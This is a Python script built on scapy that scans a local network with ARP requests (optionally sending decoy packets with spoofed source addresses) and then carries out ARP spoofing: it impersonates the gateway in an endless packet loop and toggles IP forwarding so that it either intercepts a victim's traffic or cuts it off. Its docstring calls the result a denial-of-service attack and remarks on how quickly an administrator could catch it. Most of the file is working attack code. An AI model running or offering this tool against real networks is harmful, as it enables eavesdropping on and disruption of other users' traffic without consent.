#! /usr/bin/python

from scapy.all import * #Forge packets
import netifaces #Manipulate interfaces
import netaddr   #Manipulate address
import os
import sys
from tools import *
import fcntl, socket, struct
import random
from threading import Thread #Use thread for decoy scan

class Decoy(Thread):
    def __init__(self, fakeIp, targetList, interface):
        Thread.__init__(self)
        self.fakeIp = fakeIp
        self.targetList = targetList
        self.interface = interface

    def run(self):
        send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = self.targetList, psrc=self.fakeIp), iface=self.interface, verbose=0)

def select_interface():
    all_interfaces = netifaces.interfaces()
    all_interfaces_reversed = reversed(all_interfaces)
    print(colors.CLEAR)
    for interface in all_interfaces_reversed:
        print(colors.HEADER+"Please select an interface in the list:"+colors.ENDC)
        print(str(all_interfaces))
        print(colors.BREVERSE+"--"+interface+"--"+colors.ENDC)
        answer = raw_input()
        print(colors.CLEAR)
        if answer == "y":
            return str(interface)
    #if the user has not made a choice
    return select_interface()

def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    """return the mac address of the interface ifname"""
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    return ':'.join(['%02x' % ord(char) for char in info[18:24]])

def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def get_all_addresses(my_interface):
    ip = netifaces.ifaddresses(my_interface)[2][0]['addr']
    netmask = netifaces.ifaddresses(my_interface)[2][0]['netmask']

    netaddr_ip = netaddr.IPAddress(ip)
    netaddr_netmask = netaddr.IPAddress(netmask)
    netaddr_network = netaddr_ip & netaddr_netmask

    netaddr_full_network = netaddr.IPNetwork(str(netaddr_ip) + '/' + str(netaddr_netmask))
    netaddr_list = netaddr.IPRange(netaddr_network, netaddr_full_network[-2])

    #Create a list sr compatible to avoid to use sr in a loop
    addr_list = []
    for address in netaddr_list:
        addr_list.append(str(address))
    return addr_list

def arp_scan(my_interface, decoy=False, verbosity=0):
    addr_list = get_all_addresses(my_interface)
    #-----------------------------ARP scan------------------------------------------
    #Start the ARP scan
    if verbosity > 0:
        print(colors.OKGREEN+"Be patient that can take a while."+colors.ENDC)
    #send a first random decoy scan if u use the option
    if decoy:
        if verbosity > 0:
            print("send a first decoy")
        fake = random.randint(0,len(addr_list))
        thread_1 = Decoy(str(fake), addr_list, my_interface)
        thread_1.start()
        thread_1.join()
        time.sleep(0.2)
    #send&receive packets for the arp scan
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = addr_list), timeout=1, iface=my_interface, verbose=verbosity, retry=1) #retry=2
    #-----------------------------Save the result------------------------------------------
    nb_decoy=3 # limit the number of decoys
    threads_list = []
    ip_list = []
    for snd, rcv in ans:
        his_ip = rcv.sprintf(r"%Ether.psrc%")
        his_mac = rcv.sprintf(r"%Ether.src%")
        ip_list.append(his_ip)
        if decoy and nb_decoy > 0:
            my_thread = Decoy(str(his_ip), addr_list, my_interface)
            my_thread.start()
            threads_list.append(my_thread)
            nb_decoy -= 1
        try:
            info = socket.gethostbyaddr(his_ip)
            his_hostname = str(info[0])
            if verbosity > 0:
                print(his_mac+" - "+his_ip+" - "+his_hostname)
        except:
            print(his_mac+" - "+his_ip)
    if verbosity > 0:
        print(colors.OKGREEN+"\nIt's done."+colors.ENDC+" Press a button to quit")
    for current in threads_list:
        current.join()
    return ip_list

def preset_arp_spoofing(ip_forward=True):
    """return the gateway in result[0], the target in result[1] and the mac address in result[2]

    -if ip_forward is false you make an dos attack
    -else you able to see all packets send by the target
    Be carefull if this attack is inconspicuous for a normal user,
    a system administrator can caught you relatively quickly,
    because this generate an irregular traffic on the network.
    """
    print ip_forward
    result = []
    my_interface = select_interface()

    gateway = get_default_gateway_linux()
    if not gateway:
        gateway = select_val(target_list,"Select the gateway:")
    result.append(gateway)

    print(colors.HEADER+"search devices on the network"+colors.ENDC)
    target_list = arp_scan(my_interface)
    print(colors.CLEAR+colors.OKBLUE+colors.BOLD+"press y to spoof all the network")
    print("press n to spoof only one target on the network"+colors.ENDC)
    answer = raw_input()
    if answer == "n":
        target = select_val(target_list,"Please select a victim:")
        result.append(target)
    else:
        target = arp_scan(my_interface)
        result.append(target)

    forward = open("/proc/sys/net/ipv4/ip_forward", "w")
    if ip_forward:
        forward.write("1")
    else:
        forward.write("0")
    forward.close()
    my_mac = getHwAddr(my_interface)
    if not my_mac:
        print(colors.FAIL+"Cant get local mac address, quitting"+colors.ENDC)
        sys.exit(1)
    result.append(my_mac)
    return result

def arpSpoofing(gateway_ip, target_ip, my_mac):
    """"Sends requests in a loop as if we were the gateway"""
    packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=gateway_ip,pdst=target_ip)
    while 1:
        sendp(packet, verbose=0)
